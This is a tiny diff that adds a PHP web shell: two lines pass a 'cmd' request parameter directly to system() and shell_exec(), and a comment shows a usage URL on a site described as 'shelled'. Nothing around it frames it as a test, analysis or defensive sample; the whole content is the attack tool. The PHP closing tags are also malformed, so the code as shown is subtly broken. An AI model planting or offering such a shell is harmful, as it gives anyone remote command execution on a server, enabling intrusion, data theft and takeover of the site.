@@ -1,0 +1,5 @@
+//http://shelledwebsite.com/revshell.php?cmd=ls
+
+
+<?php echo system($_GET['cmd']);>
+<?php echo shell_exec($_GET['cmd']);>
